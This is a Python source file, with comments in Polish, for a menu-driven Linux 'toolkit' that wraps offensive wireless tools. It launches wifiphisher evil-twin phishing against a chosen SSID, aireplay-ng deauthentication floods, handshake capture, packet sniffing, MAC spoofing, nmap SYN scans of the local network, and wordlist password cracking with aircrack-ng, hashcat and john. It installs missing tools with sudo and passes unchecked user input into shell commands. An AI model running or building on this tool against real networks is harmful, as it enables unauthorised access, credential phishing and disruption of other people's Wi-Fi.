import os
import platform
import subprocess
import shutil

def get_local_ip():
    try:
        ip = subprocess.check_output("hostname -I", shell=True).decode().strip().split()[0]
        return ip
    except Exception:
        return "127.0.0.1"

def get_network():
    ip = get_local_ip()
    parts = ip.split('.')
    return '.'.join(parts[:3]) + '.0/24'

def choose_ssid():
    print("\nScanning for available networks (10s)...")
    # Uruchom airodump-ng na 10s, zapisz do csv
    os.system("airodump-ng wlan0mon --write scan --output-format csv --write-interval 10 & sleep 10; killall airodump-ng")

    ssids = []
    try:
        with open("scan-01.csv", "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            for line in lines:
                if "," in line and "WPA" in line and not line.startswith("Station"):
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) > 13 and parts[13] and parts[13] not in ssids:
                        ssids.append(parts[13])
    except FileNotFoundError:
        print("No scan results found.")
        return None

    if not ssids:
        print("No SSIDs found.")
        return None

    print("\nAvailable SSIDs:")
    for i, ssid in enumerate(ssids):
        print(f"{i + 1}. {ssid}")

    selection = input("\nChoose SSID (number): ").strip()
    if selection.isdigit() and 1 <= int(selection) <= len(ssids):
        return ssids[int(selection) - 1]
    else:
        print("Invalid selection.")
        return None

def list_wordlists(path="wordlists"):
    if not os.path.exists(path):
        print(f"No wordlists folder found at '{path}'.")
        return []
    files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
    return files

if platform.system() != "Linux":
    print("This toolkit works only on Linux.")
    exit()

# Clear screen
os.system("clear")


options = [
    "1. Evil Twin",
    "2. WiFi Cracker",
    "3. Handshake Capture",
    "4. Packet Sniffer",
    "5. Deauth Attack",
    "6. MAC Changer",
    "7. Channel Hopper",
    "8. WPA2 Brute-force",
    "9. Network Scan",
    "10. Password Crack"
]

commands = [
    ("wifiphisher", "wifiphisher -e \"{ssid}\""),
    ("aircrack-ng", "aircrack-ng -w {wordlist} {capture}"),
    ("airodump-ng", "airodump-ng wlan0mon"),
    ("tcpdump", "tcpdump -i wlan0"),
    ("aireplay-ng", "aireplay-ng --deauth 100 -a {bssid} wlan0mon"),
    ("macchanger", "macchanger -r wlan0"),
    ("iwconfig", "iwconfig wlan0 channel {channel}"),
    ("hashcat", "hashcat -m {mode} {hashfile} {wordlist}"),
    ("nmap", f"nmap -sS {get_network()}"),
    ("john", "john --wordlist={wordlist} {hashfile}")
]

while True:
    os.system("clear")
    print("""
                                    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄           
                                    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          
                                    ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          
                                    ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌       ▐░▌    ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
                                    ░▌       ▐░▌▐░▌▐░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌         ▐░▌     ▐░▌       ▐░▌    ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
                                    ▐░▌       ▐░▌▐░▌ ▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░▌░▌        ▐░▌     ▐░▌       ▐░▌    ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
                                    ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌     ▐░▌            ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌       ▐░▌    ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
                                    ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌    ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
                                    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
                                    ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
""")
    print("\nChoose a tool:\n")
    width = os.get_terminal_size().columns
    padding = " " * 10
    for i in range(0, len(options), 2):
        left = options[i]
        right = options[i + 1] if i + 1 < len(options) else ""
        print((left + padding + right).center(width))

    print("\n0. Exit")
    choice = input("\nSelect option: ").strip()
    if choice == "0":
        break

    if not choice.isdigit() or not (1 <= int(choice) <= 10):
        input("Invalid option. Press Enter to continue...")
        continue

    idx = int(choice) - 1
    tool, raw_cmd = commands[idx]

    # Sprawdź czy narzędzie jest zainstalowane
    if shutil.which(tool) is None:
        print(f"\n{tool} is not installed. Attempting to install...")
        os.system(f"sudo apt update")
        os.system(f"sudo apt install -y {tool}")

    cmd = raw_cmd

    # Obsługa parametrów
    if "{ssid}" in cmd:
        ssid = choose_ssid()
        if not ssid:
            input("SSID not selected. Press Enter to continue...")
            continue
        cmd = cmd.replace("{ssid}", ssid)

    if "{bssid}" in cmd:
        bssid = input("Enter BSSID for the attack: ").strip()
        if not bssid:
            input("BSSID not provided. Press Enter to continue...")
            continue
        cmd = cmd.replace("{bssid}", bssid)

    if "{channel}" in cmd:
        channel = input("Enter Wi-Fi channel number: ").strip()
        if not channel:
            input("Channel not provided. Press Enter to continue...")
            continue
        cmd = cmd.replace("{channel}", channel)

    if "{mode}" in cmd:
        mode = input("Enter hashcat mode (e.g. 2500): ").strip()
        if not mode:
            input("Mode not provided. Press Enter to continue...")
            continue
        cmd = cmd.replace("{mode}", mode)

    if "{wordlist}" in cmd:
        # Wybierz wordlistę z folderu wordlists
        wordlists = list_wordlists()
        if not wordlists:
            input("No wordlists found. Press Enter to continue...")
            continue
        print("\nAvailable wordlists:")
        for i, wl in enumerate(wordlists):
            print(f"{i + 1}. {wl}")
        selection = input("Select wordlist (number): ").strip()
        if not selection.isdigit() or not (1 <= int(selection) <= len(wordlists)):
            input("Invalid selection. Press Enter to continue...")
            continue
        chosen_wl = os.path.join("wordlists", wordlists[int(selection) -1])
        cmd = cmd.replace("{wordlist}", chosen_wl)

    if "{capture}" in cmd:
        capture = input("Enter path to .cap file: ").strip()
        if not capture:
            input("Capture file not provided. Press Enter to continue...")
            continue
        cmd = cmd.replace("{capture}", capture)

    if "{hashfile}" in cmd:
        hashfile = input("Enter path to hash file: ").strip()
        if not hashfile:
            input("Hash file not provided. Press Enter to continue...")
            continue
        cmd = cmd.replace("{hashfile}", hashfile)

    print(f"\nExecuting:\n{cmd}\n")
    os.system(cmd)
    input("\nPress Enter to continue...")
